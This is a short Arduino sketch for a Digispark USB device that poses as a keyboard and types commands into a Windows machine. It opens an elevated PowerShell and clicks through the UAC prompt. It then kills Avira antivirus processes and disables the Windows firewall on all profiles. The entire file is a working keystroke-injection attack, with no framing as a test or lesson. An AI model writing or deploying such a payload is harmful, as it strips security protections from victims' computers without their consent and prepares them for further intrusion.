#include "DigiKeyboard.h"
#define KEY_LEFT_ARROW 0x50

int timer = 2000;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(timer);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(timer);
  DigiKeyboard.print("Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(timer);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(timer);
  DigiKeyboard.print("Stop-Process -name Avira*");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(timer);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(timer);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(timer);
  DigiKeyboard.print("cmd.exe /c 'netsh advfirewall set allprofiles state off'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (int x = 0; x < 3 ;x++)
  {
    DigiKeyboard.delay(timer);
    DigiKeyboard.print("exit");
    DigiKeyboard.delay(timer);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }
}

void loop() {
}
